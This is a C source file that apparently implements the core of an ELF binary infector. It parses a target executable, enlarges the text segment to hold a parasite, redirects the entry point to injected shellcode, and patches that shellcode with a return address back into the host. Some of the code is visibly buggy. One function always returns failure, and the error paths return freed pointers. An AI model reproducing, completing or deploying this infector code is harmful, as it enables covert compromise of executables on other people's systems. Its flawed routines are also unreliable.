#include "elffile.h"
#include <elf.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/mman.h>

static int shellcode_patch_ret_address(struct Shellcode *this,  \
        Elf64_Addr addr)
{
    for(int i = 0; i < this->m_size; i++){
        if(*((uint8_t *)this->m_shellcode + i) == 0x55 &&       \
                *((uint8_t *)this->m_shellcode + (i+1)) == 0x99){
            printf("signature found\n");
            printf("replacing address with entry point %lx\n",  \
                    addr);
            char buffer[16];
            sprintf(buffer, "%lx", addr);

            for(int j = 0; j < 16; j++, i++){
                *((uint8_t *)this->m_shellcode + i) = buffer[j];
            }
            return 0;
        }
    }
    printf("signature not found in shellcode\n");
    return -1;
}

static int shellcode_extract_section(Shellcode *this, int index)
{
    this->m_size = (this->m_elf->m_shdr[index].sh_size + 8);
    this->m_shellcode = malloc(sizeof(uint8_t) * this->m_size);
    if(this->m_shellcode == NULL){
        goto err1;
    }

    memset(this->m_shellcode, 0, this->m_size);
    memcpy(this->m_shellcode, &this->m_elf->m_map[this->        \
            m_elf->m_shdr[index].sh_offset], this->m_elf->m_shdr\
            [index].sh_size);

err1:
    return -1;
}

/* to adjust section headers and other offsets */
static void target_adjust_sections(Target *this)
{
    this->m_elf->m_ehdr->e_entry = this->parasite_addr;
    for(int i = 0; i < this->m_elf->m_ehdr->e_shnum; i++){
        if(this->m_elf->m_shdr[i].sh_addr > this->parasite_addr){
            /* 
             * increase offset of every section after infected one
             * by PAGE_SIZE
             */
            this->m_elf->m_shdr[i].sh_offset += PF_HP_PAGE_SIZE;
        } else {
            /* 
             * if sh_addr + sh_size == parasite_addr, we are at 
             * .text section. since we havent modified section
             * header's values such as sh_size, we should do that
             * now
             */
            if(this->m_elf->m_shdr[i].sh_addr + this->m_elf->   \
                    m_shdr[i].sh_size == this->parasite_addr){
                this->m_elf->m_shdr[i].sh_size +=               \
                    this->parasite_size;
            }
        }
    }
}

/* find free space in target binary */
static int target_find_free_space(Target *this)
{
    bool text_found = false;
    for(int i = 0;i < this->m_elf->m_ehdr->e_phnum; i++){
        if(this->m_elf->m_phdr[i].p_type == PT_LOAD && this->   \
                m_elf->m_phdr[i].p_flags == (PF_R | PF_X)){
            printf("text segment found\n");
            this->text_filesize = this->m_elf->m_phdr[i].p_filesz;
            Elf64_Off text_start = this->m_elf->m_phdr[i].p_offset;
            this->text_end = text_start + this->text_filesize;
            this->parasite_addr = this->m_elf->m_phdr[i].       \
                p_vaddr + this->text_filesize;

            /* resizing p_filesz and p_memsz */
            this->m_elf->m_phdr[i].p_filesz += this->parasite_size;
            this->m_elf->m_phdr[i].p_memsz += this->parasite_size;
            text_found = true;

        } else if (this->m_elf->m_phdr[i].p_type == PT_LOAD &&  \
            (this->m_elf->m_phdr[i].p_offset - this->text_end)  \
            < this->parasite_size && text_found){
            this->available_freespace = this->m_elf->m_phdr[i]. \
                p_offset - this->text_end;
            printf("segment found with a gap of %d\n", this->   \
                    available_freespace);
            text_found = false;
        } else {
            fprintf(stderr, "failed to find free space to       \
                    inject shellcode\n");
            goto err;
        }
    }

    return 0;

err:
    return -1;
}

/* to get the .text section code from our shellcode */
static int elf_get_section_index_by_name(Elf *elf, const char   \
        *section_name)
{
    /* first we have to parse shstrtab */
    Elf64_Shdr *section = &elf->m_shdr[elf->m_ehdr->e_shstrndx];
    char *shstrtab = (char *)&elf->m_map[section->sh_offset];

    for(int i = 0; i < elf->m_ehdr->e_shnum; i++){
        if(strcmp(&shstrtab[elf->m_shdr[i].sh_name],            \
                    section_name) == 0){
            printf("%s section found\n", section_name);
            return i;
        }
    }

    return -1;
}

static void elf_parse_headers(Elf *elf)
{
    elf->m_ehdr = (Elf64_Ehdr *) elf->m_map;
    elf->m_phdr = (Elf64_Phdr *) &elf->m_map[elf->m_ehdr->      \
        e_phoff];
    elf->m_shdr = (Elf64_Shdr *) &elf->m_map[elf->m_ehdr->      \
        e_shoff];
}

static bool elf_is_elf(Elf *elf)
{
    if(elf->m_map == NULL){
        fprintf(stderr, "file not mapped\n");
        goto err;
    }

    if(elf->m_map[0] != 0x7f || elf->m_map[1] != 'E' ||         \
            elf->m_map[2] != 'L' || elf->m_map[3] != 'F'){
        fprintf(stderr, "not an elf binary\n");
        goto err;
    }

    return true;

err:
    return false;
}

static int elf_init_file(Elf *this)
{
    if(this->m_filename == NULL){
        fprintf(stderr, "filename not specified\n");
        goto err;
    }

    int fd = open(this->m_filename, O_RDWR);
    if(fd < 0){
        fprintf(stderr, "file open error");
        goto err;
    }

    struct stat st;
    if(fstat(fd, &st) < 0){
        fprintf(stderr, "fstat failed\n");
        goto err1;
    }

    this->m_size = st.st_size;
    this->m_map =mmap(NULL, this->m_size, PROT_READ |PROT_WRITE \
        , MAP_PRIVATE, fd, 0);
    if(this->m_map == MAP_FAILED){
        fprintf(stderr, "memory map failed");
        goto err1;
    }

    close(fd);
    return 0;

err1:
    close(fd);

err:
    return -1;
}

Elf *ElfConstructor(const char *filename)
{
    Elf *elf = malloc(sizeof(Elf));
    if(elf == NULL){
        fprintf(stderr, "memory allocation failed\n");
        goto err;
    }

    elf->m_filename = filename;
    elf->m_size = 0;
    elf->m_map = NULL;
    elf->m_ehdr = NULL;
    elf->m_phdr = NULL;
    elf->m_shdr = NULL;

    elf->InitFile = elf_init_file;
    elf->IsElf = elf_is_elf;
    elf->ParseHeaders = elf_parse_headers;
    elf->FindSectionIndexByName = elf_get_section_index_by_name;

err:
    return elf;
}

void ElfDestructor(Elf *this)
{
    if(this->m_map != NULL){
        if(munmap(this->m_map, this->m_size) < 0){
            fprintf(stderr, "memory unmap failed\n");
        }
        this->m_map = NULL;
    }

    free(this);
}

Target *TargetConstructor(const char *filename)
{
    Target *target = malloc(sizeof(Target));
    if(target == NULL){
        fprintf(stderr, "memory allocation error\n");
        goto err;
    }

    target->m_elf = ElfConstructor(filename);
    if(target->m_elf == NULL){
        goto err1;
    }

    if(target->m_elf->InitFile(target->m_elf) < 0){
        goto err2;
    }

    if(target->m_elf->IsElf(target->m_elf) == false){
        goto err2;
    }

    target->m_elf->ParseHeaders(target->m_elf);

    return target;

err2:
    ElfDestructor(target->m_elf);

err1:
    free(target);

err:
    return target;
}

void TargetDestructor(Target *this)
{
    ElfDestructor(this->m_elf);
    free(this);
}

Shellcode *ShellcodeConstructor(const char *filename)
{
    Shellcode *shellcode = malloc(sizeof(Shellcode));
    if(shellcode == NULL){
        fprintf(stderr, "memory allocation error\n");
        goto err;
    }

    shellcode->m_elf = ElfConstructor(filename);
    if(shellcode->m_elf == NULL){
        goto err1;
    }

    if(shellcode->m_elf->InitFile(shellcode->m_elf) < 0){
        goto err2;
    }

    if(shellcode->m_elf->IsElf(shellcode->m_elf) == false){
        goto err2;
    }

    shellcode->m_elf->ParseHeaders(shellcode->m_elf);

    return shellcode;

err2:
    ElfDestructor(shellcode->m_elf);

err1:
    free(shellcode);

err:
    return shellcode;
}
